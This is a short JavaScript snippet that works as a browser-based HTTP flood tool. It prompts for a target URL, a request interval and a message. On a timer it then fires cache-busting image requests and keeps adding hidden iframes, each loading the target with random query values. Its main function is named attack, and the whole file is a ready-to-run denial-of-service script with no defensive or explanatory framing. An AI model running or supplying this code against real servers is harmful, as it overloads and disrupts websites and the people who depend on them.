var target = prompt("Enter the full Image URL, including https:// and add / to the end");
var speed = parseInt(prompt("Make request every [blank] milliseconds"));
var msg = prompt("Message to HTTP server");

function attack() {  
  var pic = new Image();
  var rand1 = Math.floor(Math.random() * 99999999999999999999);
  var rand2 = Math.floor(Math.random() * 99999999999999999999);
  
  // Construct the URL with HTTPS
  var url = target + "?r=" + rand1 + "&msg=" + encodeURIComponent(msg);
  pic.src = url;

  // Add an iframe with a unique source to bypass cache
  document.body.innerHTML += '<iframe src="' + target + '?daKillaOfZeeCache=' + rand2 + '&msg=' + encodeURIComponent(msg) + '" style="display:none;"></iframe>';
  
  pic.onload = function () { console.log("Request succeeded for: " + url); };
  pic.onerror = function () { console.log("Request failed for: " + url); };
}

setInterval(attack, speed);
